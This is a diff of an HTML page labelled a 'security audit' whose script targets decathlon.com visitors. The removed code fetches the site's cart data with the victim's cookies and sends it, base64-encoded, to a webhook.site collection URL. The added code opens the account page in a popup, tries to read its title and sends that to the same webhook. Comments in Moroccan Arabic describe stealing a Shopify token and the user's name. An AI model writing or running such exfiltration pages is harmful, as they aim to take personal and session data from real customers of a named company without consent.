@@ -1,22 +1,24 @@
 <!DOCTYPE html>
 <html>
 <body>
+    <h1>Security Audit - Data Access Test</h1>
     <script>
         var webhook = "https://webhook.site/2cbc72eb-5f42-44f9-998b-7a8dd2611ef0";
 
-        // غانطلبو الصفحة اللي فيها معلومات الكليان (Shopify Client Info)
-        // السيرفر غايصيفطها حيت المتصفح غايزيد الكوكيز أوتوماتيكيا
-        fetch('https://www.decathlon.com/cart.js', {credentials: 'include'})
-        .then(response => response.json())
-        .then(data => {
-            // هنا غانجبدو الـ Token ديال Shopify اللي كيكون وسط الـ JSON
-            var leak = btoa(JSON.stringify(data));
-            window.location.href = webhook + "?shopify_leak=" + leak;
-        })
-        .catch(err => {
-            // إلا فشلات، غانصيفطو غير الداتا اللي مسموح بيها
-            window.location.href = webhook + "?debug=CORS_Limited";
-        });
+        // غانحاولوا نفتحوا نافذة صغيرة (Popup) ديال ديكاثلون 
+        // ونشوفوا واش نقدروا نجبدو منها معلومات عبر الـ Opener
+        var win = window.open("https://www.decathlon.com/account", "victim_page");
+
+        setTimeout(function() {
+            try {
+                // محاولة سرقة عنوان الصفحة (إلا كان فيه السمية ديالك)
+                var secret_info = win.document.title; 
+                window.location.href = webhook + "?leak=" + btoa(secret_info);
+            } catch(e) {
+                // إلا تبلوكا، غانبيّنو بلي نقدرو نديرو "Clickjacking" على الأقل
+                window.location.href = webhook + "?status=SOP_Active_But_Targeted";
+            }
+        }, 3000);
     </script>
 </body>
 </html>
